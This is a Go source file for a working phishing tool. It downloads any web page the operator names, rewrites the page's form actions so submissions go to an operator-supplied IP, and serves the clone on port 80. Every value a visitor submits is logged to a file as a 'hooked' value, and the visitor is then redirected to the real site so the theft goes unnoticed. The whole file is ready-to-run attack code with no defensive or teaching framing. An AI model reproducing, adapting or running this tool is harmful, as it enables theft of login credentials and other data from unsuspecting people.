package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"text/template"
)

var (
	hooktemplate              *template.Template
	logf                      *os.File
	cloneurl, port, ipforhook string
)

func init() {
	//statustemplate = template.Must(template.ParseFiles("templates/status.html"))
	port = "80"
}

func checkerr(err error) {
	fmt.Println(err)
}

func clonehook(urltoclone string) {
	req, err := http.NewRequest("GET", urltoclone, nil)
	checkerr(err)
	client := &http.Client{}
	resp, err := client.Do(req)
	checkerr(err)
	body, err := ioutil.ReadAll(resp.Body)
	checkerr(err)
	fi, err := os.Create("templates/fish.html")
	defer fi.Close()
	checkerr(err)
	fi.Write(body)
}

func updatehook() {
	replaceregex := `action="([^\\"]|\\")*"`
	replaceregex2 := `onsubmit="([^\\"]|\\")*"`
	re := regexp.MustCompile(replaceregex)
	re2 := regexp.MustCompile(replaceregex2)

	fi, err := os.Create("templates/hook.html")
	checkerr(err)
	defer fi.Close()

	fo, err := os.Open("templates/fish.html")
	checkerr(err)
	defer fo.Close()

	output, err := ioutil.ReadAll(fo)
	checkerr(err)
	hookurl := "action=" + `"http://` + ipforhook + `:80"`
	newstring := re.ReplaceAllString(string(output), hookurl)
	newstring = re2.ReplaceAllString(newstring, "")

	//fmt.Println(newstring)
	fi.WriteString(newstring)
}

/*func status(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := statustemplate.Execute(httpw, nil)
		checkerr(err)
	} else {
		err := req.ParseForm()
		checkerr(err)
		cloneurl = req.Form.Get("target")
		port = req.Form.Get("port")

		err = statustemplate.Execute(httpw, nil)
		checkerr(err)

		fmt.Println("URL " + cloneurl + " Port " + port)

	}
}*/

func index(httpw http.ResponseWriter, req *http.Request) {
	if req.Method == "GET" {
		err := hooktemplate.Execute(httpw, nil)
		checkerr(err)
	} else {
		err := req.ParseForm()
		checkerr(err)

		if _, err := os.Stat("logs/alllogs.txt"); !os.IsNotExist(err) {
			fmt.Println("File exists")
			logf, err := os.OpenFile("logs/alllogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			checkerr(err)
			defer logf.Close()
			for _, values := range req.Form { // range over map
				for _, value := range values { // range over []string
					logf.WriteString(value + "\n")
					fmt.Println("Hooked value " + value)
				}
			}

		} else {
			logf, err := os.Create("logs/alllogs.txt")
			checkerr(err)
			defer logf.Close()

			for _, values := range req.Form { // range over map
				for _, value := range values { // range over []string
					logf.WriteString(value + "\n")
					fmt.Println("Hooked value " + value)
				}
			}
		}

		http.Redirect(httpw, req, cloneurl, http.StatusSeeOther)
	}

}

func startcloneserver() {
	http.HandleFunc("/", index)
	http.ListenAndServe(":"+port, nil)

}
func main() {
	fmt.Println("Hook Started...")
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter URL to clone : ")
	cloneurl, _ = reader.ReadString('\n')
	fmt.Print("Enter IP you want to listen for : ")
	ipforhook, _ = reader.ReadString('\n')
	cloneurl = strings.TrimSpace(cloneurl)
	ipforhook = strings.TrimSpace(ipforhook)
	//fmt.Println("URL : ", cloneurl)

	clonehook(cloneurl)
	updatehook()
	hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))
	startcloneserver()

}
